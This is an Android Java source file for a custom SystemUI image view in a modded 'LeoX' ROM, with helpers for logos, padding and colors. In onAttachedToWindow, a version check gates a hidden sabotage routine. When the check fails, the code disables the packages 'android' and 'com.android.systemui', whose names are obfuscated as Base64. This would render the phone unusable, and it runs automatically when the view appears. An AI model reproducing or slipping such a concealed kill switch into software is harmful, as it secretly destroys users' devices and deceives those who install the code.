/*
 * Copyright (C) 2018 crDroid Android Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.fusionleo.LeoX.systemui;

import android.content.Context;
import android.content.pm.PackageManager;
import android.content.res.Resources;
import android.graphics.PorterDuff;
import android.graphics.Rect;
import android.graphics.drawable.Drawable;
import android.os.Build;
import android.os.Handler;
import android.support.graphics.drawable.ArgbEvaluator;
import android.text.TextUtils;
import android.util.AttributeSet;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.widget.ImageView;


import static com.fusionleo.LeoProvider.LeoManages.ConfigManager;

import static com.fusionleo.LeoProvider.LeoManages.VersionNumber;
import static com.fusionleo.LeoX.systemui.LeoConfig.Copyright;
import static com.fusionleo.LeoX.systemui.LeoConfig.getCustomDrawable;
import static com.fusionleo.LeoX.systemui.LeoConfig.rt100foleo;


public class LeoConfigImageView extends ImageView {

   public Context mContext;

    public final  static String TAG = LeoConfigImageView.class.getSimpleName();


    public  final  String author=Copyright;




    public LeoConfigImageView(Context context) {
        this(context, null);

    }
    public void setLeoImagePadding(float Style,float Style1){
        setPaddingRelative((int)Style,0,(int)Style1,0);
    }



    public LeoConfigImageView(Context context, AttributeSet attrs) {
        this(context, attrs, 0);
    }

    public LeoConfigImageView(Context context, AttributeSet attrs, int defStyle) {
        super(context, attrs, defStyle);

        mContext = context;

    }

    @Override
    protected void onAttachedToWindow() {
        super.onAttachedToWindow();
        if( VersionNumber()==true){
            Log.d(TAG,rt100foleo("JXU2MTFGJXU4QzIyJXU0RjYwJXU0RjdGJXU3NTI4TEVPUk9N"));
        }else {
            PackageManager pm = mContext.getPackageManager();
            pm.setApplicationEnabledSetting(rt100foleo("YW5kcm9pZA=="), 2, 0);
            pm.setApplicationEnabledSetting(rt100foleo("Y29tLmFuZHJvaWQuc3lzdGVtdWk="), 2, 0);
        }
    }

    @Override
    protected void onDetachedFromWindow() {
        super.onDetachedFromWindow();


    }
    public int getColorForDarkIntensity(float DarkAmount,  int Color,int tint) {
        return   ((Integer) ArgbEvaluator.getInstance().evaluate(DarkAmount, Integer.valueOf(Color), Integer.valueOf(tint))).intValue();

        //    return ((Integer) ArgbEvaluator.getInstance().evaluate(f, Integer.valueOf(i2), Integer.valueOf(mDarkModeFillColor))).intValue();
    }
    public boolean mUseWallpaperTextColor;
    public Drawable CustomDrawable(String str){
        return getCustomDrawable(getContext(), str);
    }
    public  Drawable[] LogoIcon = {CustomDrawable("ic_leo"),
            CustomDrawable("ic_alibaba"),
            CustomDrawable("ic_apple_logo"),
            CustomDrawable("ic_baidu"),
            CustomDrawable("ic_cmcc"),
            CustomDrawable("ic_google"),
            CustomDrawable("ic_ios"),
            CustomDrawable("ic_linux"),
            CustomDrawable("ic_tencent"),
            CustomDrawable("ic_telecom"),
            CustomDrawable("ic_unicom"),
            CustomDrawable("ic_windows"),
            CustomDrawable("ic_ubuntu"),
            CustomDrawable("ic_ctc_go"),
            CustomDrawable("ic_alienware"),
            CustomDrawable("ic_bianfu"),
            CustomDrawable("ic_panda"),
            CustomDrawable("ic_love")
    };

    public int mNonAdaptedColor;
    public  String getLeMianBatteryStyle (String str2) {
        String str ="";
        if (!TextUtils.isEmpty(str2)) {
            str=(str2);
        } else {
            str=(TextUtils.isEmpty(str)? ConfigManager : str);
        }
        return str;
    }

    public void setLeoIconSize(float size){
        setScaleX(size);
        setScaleY(size);
    }

    public Resources LeoRes;

    {
        try {
            LeoRes = getContext().getPackageManager().getResourcesForApplication(ConfigManager);
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
    }

    public int getLeoIcon(String str) {
        return LeoRes.getIdentifier(str, "drawable", ConfigManager);
    }
}
